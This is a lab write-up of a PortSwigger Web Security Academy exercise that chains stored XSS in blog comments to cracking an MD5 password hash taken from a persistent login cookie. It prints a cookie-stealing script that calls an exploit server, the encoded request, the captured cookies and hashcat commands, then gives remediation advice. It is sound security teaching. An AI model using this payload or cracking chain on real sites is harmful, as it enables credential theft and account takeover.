# Stored XSS to Account Takeover via Client-Side Credential Hash

**Bug class:** Stored XSS, insecure credential storage
**Impact:** Full account takeover of any user who views a malicious comment
**Platform:** PortSwigger Web Security Academy

## Target

A blog application with a comments feature on each post. Authenticated users can opt into a `stay-logged-in` cookie. Other authenticated users, including privileged accounts, read new comments, providing a delivery path for stored XSS to reach a victim session.

## Vulnerability

Two flaws compose into account takeover:

1. **Stored XSS in comments.** The comment field stores user input without HTML sanitization, allowing injected scripts to execute in any reader's session.
2. **Credential material in a client-side cookie.** The persistent login cookie has the structure `base64(username + ":" + md5(password))`. It is unsigned, unencrypted, and uses a fast unsalted hash. Anyone who obtains the cookie can recover the plaintext password offline.

Chained, an unauthenticated attacker recovers the plaintext password of any user whose session loads the malicious comment.

## Exploitation

### Step 1: Stored XSS payload in comment field

The lab provides an attacker-controlled exploit server for receiving exfiltrated data:

![Exploit server configuration](images/exploit-server.png)

Posted the following comment on post 5:

```html
<script>
  fetch("https://EXPLOIT_SERVER/exploit?COOKIES=" + document.cookie);
</script>
```

The `POST /post/comment` request submitting the payload (URL-encoded in the body):

```http
POST /post/comment HTTP/1.1
Host: TARGET.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

postId=5&comment=%3Cscript%3Efetch%28%27https%3A%2F%2FEXPLOIT_SERVER
%2Fexploit%3FCOOKIES%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E&name=
blah&email=blah%40gmail.com&website=
```

When the victim (carlos) loaded the post, the script executed in their session and called back to the exploit server:

```
10.0.4.231  "GET /exploit?COOKIES=secret=A3YGy8eruOYXzBehbmXTuE7XnhsrNRP3;
              stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
              HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) ..."
```

The `Mozilla/5.0 (Victim)` user-agent confirms the simulated victim, not browser noise from my own session.

### Step 2: Decode the cookie

Base64-decoded the `stay-logged-in` value:

```
Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
  → carlos:26323c16d5f4dabff3bb136f2460a943
```

![Base64 decode of stay-logged-in cookie showing carlos:hash](images/cookie-decoded.png)

The decoded structure is the security failure made visible. The cookie is not an opaque session identifier. It is a serialized credential where the second field is a hash of the user's password.

### Step 3: Recover the plaintext password offline

The 32-character lowercase hex is consistent with MD5. Cracked with hashcat using rockyou:

```
$ echo "26323c16d5f4dabff3bb136f2460a943" > hash.txt
$ hashcat -m 0 -a 0 hash.txt ~/wordlists/rockyou.txt
```

Result:

```
26323c16d5f4dabff3bb136f2460a943:onceuponatime

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Speed.#1.........: 51737.6 kH/s
Time.Estimated...: 1 sec
Progress.........: 655360/14344384 (4.57%)
```

![Hashcat output showing onceuponatime recovered](images/hashcat-cracked.png)

This is the core security failure. MD5 is a fast hash designed for integrity checking, not credential storage. It is unsalted, so identical passwords hash to identical values and precomputed rainbow tables apply directly. The password resolved in approximately one second on an M3 laptop after testing 4.57% of rockyou. The full wordlist would have exhausted in under thirty seconds.

### Step 4: Account takeover

Logged in as `carlos` with the recovered password and deleted the account through `/my-account/delete`.

![My Account page as carlos with delete option](images/account-takeover.png)

## Reasoning notes

First attempted to replay the `stay-logged-in` cookie directly against `/my-account/delete`, bypassing the cracking step entirely. The request failed because the delete endpoint validates the live session cookie, not the persistent login cookie. Recovering the plaintext password and performing a full login was the working path.

The dead end clarified the actual trust boundary. The persistent cookie is a credential the server uses to re-authenticate the user, not a session token. The server-side flow on cookie presentation is presumably: decode → look up user → verify hash → issue a fresh session. The flaw is not that the cookie has too much privilege. The flaw is that the cookie's contents allow that re-authentication step to be performed offline by anyone who reads the cookie.

## Root cause

The application treats a hash of the user's password as an authentication token sent to the client. Any value derived deterministically from a password is functionally equivalent to the password if the hash is reversible at scale, which fast unsalted hashes are.

The correct design is an opaque, random, server-side session identifier with no functional relationship to the user's credentials. The server stores the mapping. The client holds nothing that survives revocation.

## Remediation

- **Sanitize user-supplied HTML.** Context-encode rendered comment content and enforce a Content-Security-Policy that disallows inline script execution.
- **Replace the persistent login cookie with an opaque token.** Use a cryptographically random, server-stored, revocable identifier. The cookie value must not be derivable from any user attribute.
- **Use a slow KDF for password storage.** Bcrypt, scrypt, or Argon2 with appropriate work factors. MD5 and SHA family hashes are unsuitable for credential storage regardless of how the resulting hash is transmitted.

## References

- [PortSwigger Web Security Academy: Offline password cracking](https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking)
- [OWASP: Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)
- [OWASP: XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
